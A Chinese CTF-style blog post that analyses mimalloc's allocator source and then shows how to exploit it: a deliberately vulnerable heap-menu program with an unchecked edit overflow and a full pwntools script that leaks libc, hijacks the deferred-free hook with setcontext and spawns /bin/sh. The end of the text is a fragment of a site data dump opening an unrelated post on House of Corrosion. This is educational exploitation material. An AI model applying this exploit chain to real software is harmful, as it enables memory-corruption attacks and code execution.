结构分析对于每一个线程 都有对应的内存用来管理线程 我们称其为TLD TLD主要由两个部分组成 segment和heap 我们先来介绍segment 这里的page就是实际分配给用户的内存 而第一个page的大小会小于其他page 是因为segment头部用来存放了当前segment的信息 占用了page的一部分空间 具体的成员我个人认为没有值得关注的 后面如果遇到了再说 这里先暂时记住segment的起始地址就是由于mi_malloc多分配的一块内存地址 heap重点的成员有三个 前面两个是用于存放空闲的内存块 pages_free_direct用于小于1024的内存块 thread_delayed_free是用于满页释放的 稍后会提及 通过pwndbg直接观察 会发现实际上重要信息存放是位于segment heap就起到了一个索引的功能 索引到的结构我们称之为内存页 其主要的成员就四个 红框圈起来的就是free链表 蓝框圈起来的是local free链表 你会发现 和常规的malloc不同 并不是被申请过的内存块被释放后才会放入到链表中 当我们申请一个内存块后 当前page剩下的会划分成内存块放入到free链表中 当申请过的内存块释放后 会进入local free链表 随后我们来观察一下实际分配给用户的内存空间 此时我申请的是0x80大小的内存空间 可以看到此时的free链表就已经成型了 源码分析mi_malloc我们来分析一下mi_malloc函数的源码 extern inline void* _mi_heap_malloc_zero(mi_heap_t* heap, size_t size, bool zero) mi_attr_noexcept &#123; return _mi_heap_malloc_zero_ex(heap, size, zero, 0);&#125;mi_decl_nodiscard extern inline mi_decl_restrict void* mi_heap_malloc(mi_heap_t* heap, size_t size) mi_attr_noexcept &#123; return _mi_heap_malloc_zero(heap, size, false);&#125;mi_decl_nodiscard extern inline mi_decl_restrict void* mi_malloc(size_t size) mi_attr_noexcept &#123; return mi_heap_malloc(mi_prim_get_default_heap(), size);&#125; mimalloc通过多次跳转指向了_mi_heap_malloc_zero_ex函数 我们来分析一下这个函数的源码 // The main allocation functionextern inline void* _mi_heap_malloc_zero_ex(mi_heap_t* heap, size_t size, bool zero, size_t huge_alignment) mi_attr_noexcept &#123; if mi_likely(size &lt;= MI_SMALL_SIZE_MAX) &#123; mi_assert_internal(huge_alignment == 0); return mi_heap_malloc_small_zero(heap, size, zero); &#125; else &#123; mi_assert(heap!=NULL); mi_assert(heap-&gt;thread_id == 0 || heap-&gt;thread_id == _mi_thread_id()); // heaps are thread local void* const p = _mi_malloc_generic(heap, size + MI_PADDING_SIZE, zero, huge_alignment); // note: size can overflow but it is detected in malloc_generic mi_track_malloc(p,size,zero); #if MI_STAT&gt;1 if (p != NULL) &#123; if (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125; mi_heap_stat_increase(heap, malloc, mi_usable_size(p)); &#125; #endif #if MI_DEBUG&gt;3 if (p != NULL &amp;&amp; zero) &#123; mi_assert_expensive(mi_mem_is_zero(p, size)); &#125; #endif return p; &#125;&#125; 首先是对要申请chunk的大小进行了一个判断 如果小于MI_SMALL_SIZE_MAX 就会跳转到samll chunk的申请 同时进行了一个断言检测 MI_SMALL_SIZE_MAX的值定义在mimalloc.h中 可以看到是1024(64位的情况下 和指针字节大小有关系) #define MI_SMALL_WSIZE_MAX (128)#define MI_SMALL_SIZE_MAX (MI_SMALL_WSIZE_MAXsizeof(void)) 我们先来分析大于1024的内存分配逻辑 对于heap指针是否为空和线程id进行了检查 随后跳转到_mi_malloc_generic函数中进行内存分配 mi_track_malloc函数是用来将内存块的信息存储在track跟踪器中 方便调试 接着使用了条件编译语句 根据MI_STAT的值来决定是否记录更新heap的数据 用于调试 mi_heap_stat_increase函数用于更新heap的统计数据 mi_usable_size函数用于计算内存块的实际大小(不是申请的大小) 如果MI_DEBUG的值设置为3 那么就会调用mi_assert_expensive函数检测条件是否成立 这里的条件是调用mi_mem_is_zero来检测分配的内存块的前size个字节是否为0 MI_DEBUG的默认值为0 常规情况下我们并不用担心fake_chunk被检测出来 _mi_malloc_generic随后我们进入_mi_malloc_generic函数 查看一下分析的主要逻辑 void* _mi_malloc_generic(mi_heap_t* heap, size_t size, bool zero, size_t huge_alignment) mi_attr_noexcept&#123; mi_assert_internal(heap != NULL); // initialize if necessary if mi_unlikely(!mi_heap_is_initialized(heap)) &#123; heap = mi_heap_get_default(); // calls mi_thread_init if mi_unlikely(!mi_heap_is_initialized(heap)) &#123; return NULL; &#125; &#125; mi_assert_internal(mi_heap_is_initialized(heap)); // call potential deferred free routines _mi_deferred_free(heap, false); // free delayed frees from other threads (but skip contended ones) _mi_heap_delayed_free_partial(heap); // find (or allocate) a page of the right size mi_page_t* page = mi_find_page(heap, size, huge_alignment); if mi_unlikely(page == NULL) &#123; // first time out of memory, try to collect and retry the allocation once more mi_heap_collect(heap, true /* force */); page = mi_find_page(heap, size, huge_alignment); &#125; if mi_unlikely(page == NULL) &#123; // out of memory const size_t req_size = size - MI_PADDING_SIZE; // correct for padding_size in case of an overflow on `size` _mi_error_message(ENOMEM, &quot;unable to allocate memory (%zu bytes)\\n&quot;, req_size); return NULL; &#125; mi_assert_internal(mi_page_immediate_available(page)); mi_assert_internal(mi_page_block_size(page) &gt;= size); // and try again, this time succeeding! (i.e. this should never recurse through _mi_page_malloc) if mi_unlikely(zero &amp;&amp; page-&gt;xblock_size == 0) &#123; // note: we cannot call _mi_page_malloc with zeroing for huge blocks; we zero it afterwards in that case. void* p = _mi_page_malloc(heap, page, size, false); mi_assert_internal(p != NULL); _mi_memzero_aligned(p, mi_page_usable_block_size(page)); return p; &#125; else &#123; return _mi_page_malloc(heap, page, size, zero); &#125;&#125; 最开始对于heap是否初始化了进行一个检测 如果没有初始化则进行初始化 随后调用_mi_deferred_free将本线程所有标记释放的内存块加入到延迟释放列表中 随后批量释放 这一操作是为了提高性能 调用_mi_heap_delayed_free_partial函数 释放其他线程已经标记释放的内存块 但跳过正在争用的内存块 接着调用mi_find_page函数寻找可用的page 如果没有找到则将空闲的内存块回收后再次查找 如果最后还是没有找到空闲的page 就说明空间不足 触发断言输出报错 如果找到了可用的page 接着对于page的立即可用性进行检测 以及检测page的大小是否满足size的需求 这里的检测依赖的是page的xblock成员 其存储的是当前page中的内存块大小 接着是性能优化的问题 通过xblock和zero参数来决定用哪种办法来清零内存块的内容 _mi_page_mallocextern inline void* _mi_page_malloc(mi_heap_t* heap, mi_page_t* page, size_t size, bool zero) mi_attr_noexcept &#123; mi_assert_internal(page-&gt;xblock_size==0||mi_page_block_size(page) &gt;= size); mi_block_t* const block = page-&gt;free; if mi_unlikely(block == NULL) &#123; return _mi_malloc_generic(heap, size, zero, 0); &#125; mi_assert_internal(block != NULL &amp;&amp; _mi_ptr_page(block) == page); // pop from the free list page-&gt;used++; page-&gt;free = mi_block_next(page, block); mi_assert_internal(page-&gt;free == NULL || _mi_ptr_page(page-&gt;free) == page); #if MI_DEBUG&gt;3 if (page-&gt;free_is_zero) &#123; mi_assert_expensive(mi_mem_is_zero(block+1,size - sizeof(*block))); &#125; #endif // allow use of the block internally // note: when tracking we need to avoid ever touching the MI_PADDING since // that is tracked by valgrind etc. as non-accessible (through the red-zone, see `mimalloc/track.h`) mi_track_mem_undefined(block, mi_page_usable_block_size(page)); // zero the block? note: we need to zero the full block size (issue #63) if mi_unlikely(zero) &#123; mi_assert_internal(page-&gt;xblock_size != 0); // do not call with zero&#x27;ing for huge blocks (see _mi_malloc_generic) mi_assert_internal(page-&gt;xblock_size &gt;= MI_PADDING_SIZE); if (page-&gt;free_is_zero) &#123; block-&gt;next = 0; mi_track_mem_defined(block, page-&gt;xblock_size - MI_PADDING_SIZE); &#125; else &#123; _mi_memzero_aligned(block, page-&gt;xblock_size - MI_PADDING_SIZE); &#125; &#125;#if (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN if (!zero &amp;&amp; !mi_page_is_huge(page)) &#123; memset(block, MI_DEBUG_UNINIT, mi_page_usable_block_size(page)); &#125;#elif (MI_SECURE!=0) if (!zero) &#123; block-&gt;next = 0; &#125; // don&#x27;t leak internal data#endif#if (MI_STAT&gt;0) const size_t bsize = mi_page_usable_block_size(page); if (bsize &lt;= MI_MEDIUM_OBJ_SIZE_MAX) &#123; mi_heap_stat_increase(heap, normal, bsize); mi_heap_stat_counter_increase(heap, normal_count, 1);#if (MI_STAT&gt;1) const size_t bin = _mi_bin(bsize); mi_heap_stat_increase(heap, normal_bins[bin], 1);#endif &#125;#endif#if MI_PADDING // &amp;&amp; !MI_TRACK_ENABLED mi_padding_t* const padding = (mi_padding_t*)((uint8_t*)block + mi_page_usable_block_size(page)); ptrdiff_t delta = ((uint8_t*)padding - (uint8_t*)block - (size - MI_PADDING_SIZE)); #if (MI_DEBUG&gt;=2) mi_assert_internal(delta &gt;= 0 &amp;&amp; mi_page_usable_block_size(page) &gt;= (size - MI_PADDING_SIZE + delta)); #endif mi_track_mem_defined(padding,sizeof(mi_padding_t)); // note: re-enable since mi_page_usable_block_size may set noaccess padding-&gt;canary = (uint32_t)(mi_ptr_encode(page,block,page-&gt;keys)); padding-&gt;delta = (uint32_t)(delta); #if MI_PADDING_CHECK if (!mi_page_is_huge(page)) &#123; uint8_t* fill = (uint8_t*)padding - delta; const size_t maxpad = (delta &gt; MI_MAX_ALIGN_SIZE ? MI_MAX_ALIGN_SIZE : delta); // set at most N initial padding bytes for (size_t i = 0; i &lt; maxpad; i++) &#123; fill[i] = MI_DEBUG_PADDING; &#125; &#125; #endif#endif return block;&#125; 开头对于xblock和page的free链表重新进行了检查 如果block为零 则说明不存在对应大小的page页 就调用_mi_malloc_generic函数来分配 接着自增了page的used成员 同时更新free链表 调用 mi_block_next函数来获取下一个内存块的地址 并且进行了检测 不能为0 随后根据zero来决定是否在内存块中填充数据 方便用来检测内存越界等问题 常规情况下都是\\x00 但是如果开启了调试模式 就会被填充成\\xd0 下面的一大堆编译优化的都不影响我们内存分配 所以这里忽略 感兴趣的可以自行了解 mi_find_page// Allocate a page// Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed.static mi_page_t* mi_find_page(mi_heap_t* heap, size_t size, size_t huge_alignment) mi_attr_noexcept &#123; // huge allocation? const size_t req_size = size - MI_PADDING_SIZE; // correct for padding_size in case of an overflow on `size` if mi_unlikely(req_size &gt; (MI_MEDIUM_OBJ_SIZE_MAX - MI_PADDING_SIZE) || huge_alignment &gt; 0) &#123; if mi_unlikely(req_size &gt; PTRDIFF_MAX) &#123; // we don&#x27;t allocate more than PTRDIFF_MAX (see &lt;https://sourceware.org/ml/libc-announce/2019/msg00001.html&gt;) _mi_error_message(EOVERFLOW, &quot;allocation request is too large (%zu bytes)\\n&quot;, req_size); return NULL; &#125; else &#123; return mi_large_huge_page_alloc(heap,size,huge_alignment); &#125; &#125; else &#123; // otherwise find a page with free blocks in our size segregated queues #if MI_PADDING mi_assert_internal(size &gt;= MI_PADDING_SIZE); #endif return mi_find_free_page(heap, size); &#125;&#125; 这里我们留意一下开头的这句话 &#x2F;&#x2F; Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed. 这就是当我们在调试模式下 申请一个0x200的内存块 实际分配到的是0x280的原因 MI_PADDING_SIZE在上一个小节中出现过 其用来计算填充数据的字节 检测是否存在内存溢出等 默认情况下MI_PADDING_SIZE是零 至于第一个if判断也用上了unlikely 因为几乎不会触发 看一下MI_MEDIUM_OBJ_SIZE_MAX的值就知道了 64位的情况下MI_MEDIUM_PAGE_SIZE是128kib 也就是说MI_MEDIUM_OBJ_SIZE_MAX是32*1024字节 一般来说size是肯定小于的 #define MI_MEDIUM_OBJ_SIZE_MAX (MI_MEDIUM_PAGE_SIZE/4) // 128KiB on 64-bit 接着就是调用mi_find_free_page来查找空闲的page mi_find_free_page// Find a page with free blocks of `size`.static inline mi_page_t* mi_find_free_page(mi_heap_t* heap, size_t size) &#123; mi_page_queue_t* pq = mi_page_queue(heap,size); mi_page_t* page = pq-&gt;first; if (page != NULL) &#123; #if (MI_SECURE&gt;=3) // in secure mode, we extend half the time to increase randomness if (page-&gt;capacity &lt; page-&gt;reserved &amp;&amp; ((_mi_heap_random_next(heap) &amp; 1) == 1)) &#123; mi_page_extend_free(heap, page, heap-&gt;tld); mi_assert_internal(mi_page_immediate_available(page)); &#125; else #endif &#123; _mi_page_free_collect(page,false); &#125; if (mi_page_immediate_available(page)) &#123; page-&gt;retire_expire = 0; return page; // fast path &#125; &#125; return mi_page_queue_find_free_ex(heap, pq, true);&#125; 首先通过mi_page_queue函数索引到对应大小的队列 如果是首次申请该size 一般来说都是page都是0 申请过的话 会索引到page1的内存页 接下来是debug模式才会触发的随机扩展 目的是为了增加安全性 这里不进行讨论 接着调用_mi_page_free_collect函数获取page 调用mi_page_immediate_available检测page是否可用 如果可用则置零retire_expire 将page标识为不回收 随后返回 如果page为零 那么就调用mi_page_queue_find_free_ex进行下一步的查找 mi_page_queue_find_free_exstatic mi_page_t* mi_page_queue_find_free_ex(mi_heap_t* heap, mi_page_queue_t* pq, bool first_try)&#123; // search through the pages in &quot;next fit&quot; order #if MI_STAT size_t count = 0; #endif mi_page_t* page = pq-&gt;first; while (page != NULL) &#123; mi_page_t* next = page-&gt;next; // remember next #if MI_STAT count++; #endif // 0. collect freed blocks by us and other threads _mi_page_free_collect(page, false); // 1. if the page contains free blocks, we are done if (mi_page_immediate_available(page)) &#123; break; // pick this one &#125; // 2. Try to extend if (page-&gt;capacity &lt; page-&gt;reserved) &#123; mi_page_extend_free(heap, page, heap-&gt;tld); mi_assert_internal(mi_page_immediate_available(page)); break; &#125; // 3. If the page is completely full, move it to the `mi_pages_full` // queue so we don&#x27;t visit long-lived pages too often. mi_assert_internal(!mi_page_is_in_full(page) &amp;&amp; !mi_page_immediate_available(page)); mi_page_to_full(page, pq); page = next; &#125; // for each page mi_heap_stat_counter_increase(heap, searches, count); if (page == NULL) &#123; _mi_heap_collect_retired(heap, false); // perhaps make a page available? page = mi_page_fresh(heap, pq); if (page == NULL &amp;&amp; first_try) &#123; // out-of-memory _or_ an abandoned page with free blocks was reclaimed, try once again page = mi_page_queue_find_free_ex(heap, pq, false); &#125; &#125; else &#123; mi_assert(pq-&gt;first == page); page-&gt;retire_expire = 0; &#125; mi_assert_internal(page == NULL || mi_page_immediate_available(page)); return page;&#125; 如果page为0 那么就会跳过while循环 进入if分支 调用_mi_heap_collect_retired函数 该函数就是遍历heap-&gt;page_retired_min到heap-&gt;page_retired_max之间的所有页面队列 具体的这里先不讲 接着调用mi_page_fresh函数来初始化一个新的内存页面 这里返回的值实际上就是位于segment首地址处的page info信息 如果page还是为0的话 就再次调用mi_page_queue_find_free_ex函数 如果page在while循环中获取到了 就设置page为不可回收 在最后进行了断言判断 page要么可利用 要么为0 _mi_page_free_collectvoid _mi_page_free_collect(mi_page_t* page, bool force) &#123; mi_assert_internal(page!=NULL); // collect the thread free list if (force || mi_page_thread_free(page) != NULL) &#123; // quick test to avoid an atomic operation _mi_page_thread_free_collect(page); &#125; // and the local free list if (page-&gt;local_free != NULL) &#123; if mi_likely(page-&gt;free == NULL) &#123; // usual case page-&gt;free = page-&gt;local_free; page-&gt;local_free = NULL; page-&gt;free_is_zero = false; &#125; else if (force) &#123; // append -- only on shutdown (force) as this is a linear operation mi_block_t* tail = page-&gt;local_free; mi_block_t* next; while ((next = mi_block_next(page, tail)) != NULL) &#123; tail = next; &#125; mi_block_set_next(page, tail, page-&gt;free); page-&gt;free = page-&gt;local_free; page-&gt;local_free = NULL; page-&gt;free_is_zero = false; &#125; &#125; mi_assert_internal(!force || page-&gt;local_free == NULL);&#125; 一开始首先收集thread_free中的内存块 接下来收集free和local_free的内存块 这里来分析一下逻辑 如果loacl_free链表不为空 进入if分支 检测free链表是否为空 如果为空 则将local_free链表移到free链表中 同时没有做任何的检查 也就意味着这里我们可以做到任意地址申请 只需要想办法覆盖local_free链表 mi_heap_malloc_small_zerostatic inline mi_decl_restrict void* mi_heap_malloc_small_zero(mi_heap_t* heap, size_t size, bool zero) mi_attr_noexcept &#123; mi_assert(heap != NULL); #if MI_DEBUG const uintptr_t tid = _mi_thread_id(); mi_assert(heap-&gt;thread_id == 0 || heap-&gt;thread_id == tid); // heaps are thread local #endif mi_assert(size &lt;= MI_SMALL_SIZE_MAX); #if (MI_PADDING) if (size == 0) &#123; size = sizeof(void*); &#125; #endif mi_page_t* page = _mi_heap_get_free_small_page(heap, size + MI_PADDING_SIZE); void* const p = _mi_page_malloc(heap, page, size + MI_PADDING_SIZE, zero); mi_track_malloc(p,size,zero); #if MI_STAT&gt;1 if (p != NULL) &#123; if (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125; mi_heap_stat_increase(heap, malloc, mi_usable_size(p)); &#125; #endif #if MI_DEBUG&gt;3 if (p != NULL &amp;&amp; zero) &#123; mi_assert_expensive(mi_mem_is_zero(p, size)); &#125; #endif return p;&#125; 主要的逻辑还是比较简单的 就是通过_mi_heap_get_free_small_page函数获取到适合small内存块的page 随后调用 _mi_page_malloc来申请内存块 剩余的部分就是一些check和计数信息的更新 分配那么到这里我们可以做一个大概的总结 首先进入mi_malloc函数 对于要申请的内存块的size进行了判断 如果小于0x400则进入 mi_heap_malloc_small_zero函数 如果大于0x400则进入_mi_malloc_generic函数 如果是进入mi_heap_malloc_small_zero函数 那么会调用 _mi_page_malloc来获取内存块 该函数通过page的free链表来获取相应的内存块 如果是_mi_malloc_generic函数 那么会调用mi_find_page函数来寻找可用的page 该函数继续索引到mi_find_free_page函数来寻找page 根据是否开启了debug模式来调用_mi_page_free_collect函数 如果开启了debug模式 就不会预编译对应的else分支 如果关闭了debug模式 就会进入该函数 一开始先根据force参数或者是mi_page_thread_free函数的返回值来决定是否要调用thread_free 接着检查local_free链表 根据free链表是否为空 来考虑是否要把local_free链表存放到free链表中 两种情况最后都是进入了mi_page_queue_find_free_ex函数 遍历retire链表 如果没有空闲的page就初始化一个新的page 如果初始化失败 就再次调用mi_page_queue_find_free_ex函数 mi_freevoid mi_free(void* p) mi_attr_noexcept&#123; if mi_unlikely(p == NULL) return; mi_segment_t* const segment = mi_checked_ptr_segment(p,&quot;mi_free&quot;); const bool is_local= (_mi_prim_thread_id() == mi_atomic_load_relaxed(&amp;segment-&gt;thread_id)); mi_page_t* const page = _mi_segment_page_of(segment, p); if mi_likely(is_local) &#123; // thread-local free? if mi_likely(page-&gt;flags.full_aligned == 0) // and it is not a full page (full pages need to move from the full bin), nor has aligned blocks (aligned blocks need to be unaligned) &#123; mi_block_t* const block = (mi_block_t*)p; if mi_unlikely(mi_check_is_double_free(page, block)) return; mi_check_padding(page, block); mi_stat_free(page, block); #if (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN memset(block, MI_DEBUG_FREED, mi_page_block_size(page)); #endif mi_track_free_size(p, mi_page_usable_size_of(page,block)); // faster then mi_usable_size as we already know the page and that p is unaligned mi_block_set_next(page, block, page-&gt;local_free); page-&gt;local_free = block; if mi_unlikely(--page-&gt;used == 0) &#123; // using this expression generates better code than: page-&gt;used--; if (mi_page_all_free(page)) _mi_page_retire(page); &#125; &#125; else &#123; // page is full or contains (inner) aligned blocks; use generic path _mi_free_generic(segment, page, true, p); &#125; &#125; else &#123; // not thread-local; use generic path _mi_free_generic(segment, page, false, p); &#125;&#125; 开始调用相关函数获取内存块对应的page和segment 接下来对于是否为同线程的内存块进行了判断 如果是其他线程的内存块 直接调用_mi_free_generic函数进行额外的情况 page-&gt;flags.full_aligned成员是用来查看该page是否需要内存对齐的 如果申请的大小刚好等于页的大小 那么内部就不用进行内存对齐 释放也直接调用_mi_free_generic函数来进行 接着检查了是否存在double free的情况(这里吐槽一下 我觉得这个check太仁慈了 就算检测出来 竟然也没有直接终止进程 你说就输出个报错有啥用阿哥 甚至你不开debug模式都不会进行double free检测) mi_check_padding函数主要是调试模式下 会出申请padding的内存 用来存放字节 供检测是否出现内存越界的情况 没有开启debug模式的话 直接就可以忽略掉这个函数 mi_stat_free是用来统计free内存块的信息 可以看到最后 是更新了page的local_free链表 而非free链表 也就是说释放的内存块会优先进入local_free链表 接着根据page-&gt;used的值来判断page是否都是空闲内存块 如果是 则retire整个page mi_check_is_double_free#define mi_track_page(page,access) &#123; size_t psize; void* pstart = _mi_page_start(_mi_page_segment(page),page,&amp;psize); mi_track_mem_##access( pstart, psize); &#125;static inline bool mi_check_is_double_free(const mi_page_t* page, const mi_block_t* block) &#123; bool is_double_free = false; mi_block_t* n = mi_block_nextx(page, block, page-&gt;keys); // pretend it is freed, and get the decoded first field if (((uintptr_t)n &amp; (MI_INTPTR_SIZE-1))==0 &amp;&amp; // quick check: aligned pointer? (n==NULL || mi_is_in_same_page(block, n))) // quick check: in same page or NULL? &#123; // Suspicous: decoded value a in block is in the same page (or NULL) -- maybe a double free? // (continue in separate function to improve code generation) is_double_free = mi_check_is_double_freex(page, block); &#125; return is_double_free;&#125;#elsestatic inline bool mi_check_is_double_free(const mi_page_t* page, const mi_block_t* block) &#123; MI_UNUSED(page); MI_UNUSED(block); return false;&#125; 通过mi_block_nextx函数来获取内存块的next成员 如果为0或者和内存块位于同一个page 那么就会进入mi_check_is_double_freex函数进行更加详细的check 如果不开启debug模式的话 不会进行double free检测 mi_check_is_double_freexstatic mi_decl_noinline bool mi_check_is_double_freex(const mi_page_t* page, const mi_block_t* block) &#123; // The decoded value is in the same page (or NULL). // Walk the free lists to verify positively if it is already freed if (mi_list_contains(page, page-&gt;free, block) || mi_list_contains(page, page-&gt;local_free, block) || mi_list_contains(page, mi_page_thread_free(page), block)) &#123; _mi_error_message(EAGAIN, &quot;double free detected of block %p with size %zu\\n&quot;, block, mi_page_block_size(page)); return true; &#125; return false;&#125; 通过遍历page的三个链表来查找内存块是否已经被释放过了 相对来说比较好绕过 只要更改链表头的next成员 就可以让链表索引不到已经被释放过的内存块 _mi_free_genericvoid mi_decl_noinline _mi_free_generic(const mi_segment_t* segment, mi_page_t* page, bool is_local, void* p) mi_attr_noexcept &#123; mi_block_t* const block = (mi_page_has_aligned(page) ? _mi_page_ptr_unalign(segment, page, p) : (mi_block_t*)p); mi_stat_free(page, block); // stat_free may access the padding mi_track_free_size(block, mi_page_usable_size_of(page,block)); _mi_free_block(page, is_local, block);&#125; 开始先进行了内存对齐的检测 随后就是老一套的内存块信息的记录 随后调用_mi_free_block函数释放内存块 _mi_free_blockstatic inline void _mi_free_block(mi_page_t* page, bool local, mi_block_t* block)&#123; // and push it on the free list //const size_t bsize = mi_page_block_size(page); if mi_likely(local) &#123; // owning thread can free a block directly if mi_unlikely(mi_check_is_double_free(page, block)) return; mi_check_padding(page, block); #if (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN if (!mi_page_is_huge(page)) &#123; // huge page content may be already decommitted memset(block, MI_DEBUG_FREED, mi_page_block_size(page)); &#125; #endif mi_block_set_next(page, block, page-&gt;local_free); page-&gt;local_free = block; page-&gt;used--; if mi_unlikely(mi_page_all_free(page)) &#123; _mi_page_retire(page); &#125; else if mi_unlikely(mi_page_is_in_full(page)) &#123; _mi_page_unfull(page); &#125; &#125; else &#123; _mi_free_block_mt(page,block); &#125;&#125; 仍然是先进行了内存越界和double free的检测 同时根据是否开启了debug模式 来决定是否要调用memset函数清空内存块的内容 随后就是更新local_free链表和used的值 接着检查是否要释放整个page 或者是当前page是否已经成为满页 如果是满页则从满页列表中移除 释放总结一下释放 实际上就是先进行没啥软用的double free检查 然后根据要释放的内存块是否就是整个page 来决定要不要用_mi_free_generic函数来释放 释放完的话 是加入到local_free链表 并且used的值会减少 相对来说逻辑还是比较简单的 实例利用泄露libc基址和任意写在泄露libc基址上同ptmalloc不一样 因为供用户申请的内存块就算被释放后 也不会根据大小进入bin中 从而在fd域或者bk域写入libc地址 我们在获得一个内存块后 只能获得其next域的下一个内存块的地址 而在获得内存块后 我们就可以计算得到page的地址 page中就存放着libc地址 经过偏移计算即可得到libc基址 问题在于如何构造任意写 经过上面的源码分析我们可以得知 内存块的申请是优先从free链表中获取的 如果我们拥有溢出的机会 修改下一个内存块的next域 是不是就可以实现任意地址申请 同时还需要注意一点 由于mimalloc内存地址的特殊性 如果我们申请的内存块过小 就会导致低字节处\\x00 截断输出 进而妨碍我们泄露内存块地址 可以看到此时free链表中已经写入了我们想要用来泄露libc地址的fake chunk 此时我们再次申请出同样size的两个内存块 打印第二个内存块的内容 就可以得到_mi_heap_main的地址 从而泄露libc基址 同时要注意一下 libc基址和libmimalloc基址是不一样的 2.34以上的libc版本由于2.34以上的版本的tls结构体的偏移进行了随机化 所以还需要进行爆破一个字节才能得到正确的libc的基址 getshell回顾一下mi_malloc_generic函数 // call potential deferred free routines _mi_deferred_free(heap, false); 会发现其调用了这个函数 当时我的分析是将标记释放的内存块加入到延迟释放链表中 而在ida的汇编代码中你可以看到 其是通过call指令来调用的 偏偏这个地址还是可写的 所以我们可以通过往这个地址写入system函数 从而进行任意函数调用 但是很快你会发现我们并没有办法控制rdi寄存器 但是可以控制rdx寄存器 联想ptmalloc我们是如何实现的orw 就会想到setcontext这一手法 调试题目和脚本需要的可以自行下载或者编译 链接: https://pan.baidu.com/s/1R6jhSAod4g8RQZT9tQSg_g?pwd=d193 提取码: d193 #include&lt;mimalloc.h&gt;#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;char *chunk_ptr[0x20];int chunk_size[0x20];int count=0;void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123; puts(&quot;1.mi_malloc&quot;); puts(&quot;2.mi_free&quot;); puts(&quot;3.edit&quot;); puts(&quot;4.show&quot;); puts(&quot;5.exit&quot;); printf(&quot;&gt;&gt; &quot;);&#125;int my_read()&#123; char buf[0x8]; read(0,buf,0x8); return atoi(buf);&#125;void add()&#123; int size; puts(&quot;Size :&quot;); size = my_read(); chunk_size[count] = size; chunk_ptr[count] = mi_malloc(size); count ++;&#125;void delete()&#123; puts(&quot;Index :&quot;); int index = my_read(); mi_free(chunk_ptr[index]);&#125;void edit()&#123; puts(&quot;Index :&quot;); int index = my_read(); puts(&quot;Size :&quot;); int size = my_read(); read(0,chunk_ptr[index],size);&#125;void show()&#123; puts(&quot;Index :&quot;); int index = my_read(); puts(chunk_ptr[index]);&#125;int main()&#123; init(); while(1)&#123; menu(); int choice = my_read(); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: exit(0); default: puts(&quot;Unknown option&quot;); break; &#125; &#125;&#125; from pwn import*from ctypes import *io = process(&quot;./mimalloc_heap&quot;)#io = remote(&quot;123.56.236.235&quot;,39254)elf = ELF(&quot;./mimalloc_heap&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)def debug(): gdb.attach(io) pause()def add(size): io.recvuntil(&quot;&gt;&gt; &quot;) io.send(&quot;1&quot;) io.recvuntil(&quot;Size :&quot;) io.send(str(size))def delete(index): io.recvuntil(&quot;&gt;&gt; &quot;) io.send(&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.send(str(index))def edit(index,size,payload): io.recvuntil(&quot;&gt;&gt; &quot;) io.send(&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.send(str(index)) io.recvuntil(&quot;Size :&quot;) io.send(str(size)) io.send(payload)def show(index): io.recvuntil(&quot;&gt;&gt; &quot;) io.send(&quot;4&quot;) io.recvuntil(&quot;Index :&quot;) io.send(str(index))add(0xa0)#0show(0)io.recv()heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x10140success(&quot;heap_addr :&quot;+hex(heap_addr))payload = cyclic(0xa0)+p64(heap_addr+0x188)edit(0,len(payload),payload)add(0xa0)#1add(0xa0)#2show(2)tld_main = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = tld_main-0x216380libmimalloc_addr = tld_main-0x24380success(&quot;tld_addr :&quot;+hex(tld_main))add(0xb0)#3defreed_addr = libmimalloc_addr + 0x2e190payload = cyclic(0xc0)+p64(defreed_addr-0x8)edit(3,len(payload),payload)add(0xb0)#4add(0xb0)#5success(&quot;libc_addr :&quot;+hex(libc_addr))success(&quot;libmimalloc_addr :&quot;+hex(libmimalloc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + 0x0000000000023b6aret_addr = rdi_addr+1binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))payload = p64(heap_addr+0x100a0)+p64(setcontext_addr)edit(5,len(payload),payload)payload = p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(heap_addr+0x100a0)+p64(ret_addr)edit(0,len(payload),payload)# gdb.attach(io,&#x27;b *_mi_malloc_generic+327&#x27;)add(0x500)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"House of Corrosion","slug":"House-of-Corrosion","date":"2023-07-16T08:44:01.000Z","updated":"2023-09-14T17:19:28.000Z","comments":true,"path":"2023/07/16/House-of-Corrosion/","link":"","permalink":"http://example.com/2023/07/16/House-of-Corrosion/","excerpt":"","text":"前言关于fastbin的一种利用手法 目前做题中没有做到需要这条链的 偶然看到vnctf2022的压轴题考到了这种方法 就索性来学习一下 原理主要是通过global_max_fast来实现的 其规定了fastbin链表的最大范围 如果我们将其修改为一个很大的值 那么就会导致超出范围的chunk被释放到了fastbin 和tcachebin的mp+80利用类似 